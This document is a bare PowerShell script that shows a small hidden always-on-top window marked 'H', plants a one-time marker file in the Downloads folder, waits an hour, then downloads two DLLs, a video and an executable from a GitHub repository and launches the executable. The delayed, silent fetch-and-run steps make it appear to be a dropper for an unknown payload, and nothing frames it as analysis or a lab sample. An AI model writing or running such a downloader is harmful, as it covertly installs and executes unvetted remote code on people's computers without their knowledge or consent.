$urls = @(
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/video.mp4",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
)

$filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object System.Windows.Forms.Form
$form.StartPosition = 'Manual' 
$form.FormBorderStyle = 'None'
$form.BackColor = [System.Drawing.Color]::Lime
$form.TransparencyKey = $form.BackColor
$form.TopMost = $true
$form.Width = 50
$form.Height = 50 
$label = New-Object System.Windows.Forms.Label
$label.Text = "H"
$label.ForeColor = [System.Drawing.Color]::Green
$label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.BackColor = [System.Drawing.Color]::Transparent
$form.Controls.Add($label)
$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
$formLocationX = [int]$screenWidth - [int]$form.Width
$formLocationY = [int]$screenHeight - [int]$form.Height
$form.Location = New-Object System.Drawing.Point($formLocationX, $formLocationY)
$form.Add_MouseDown({
    $form.Capture = $false
})
$form.Show()

if (Test-Path -Path $filePath) {
    exit
} else {
    New-Item -Path $filePath -ItemType File
}

Start-Sleep -Seconds 3600

$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
if (-not (Test-Path -Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir
}

foreach ($url in $urls) {
    $fileName = [System.IO.Path]::GetFileName($url)
    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
}

$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
Start-Process -FilePath $exePath
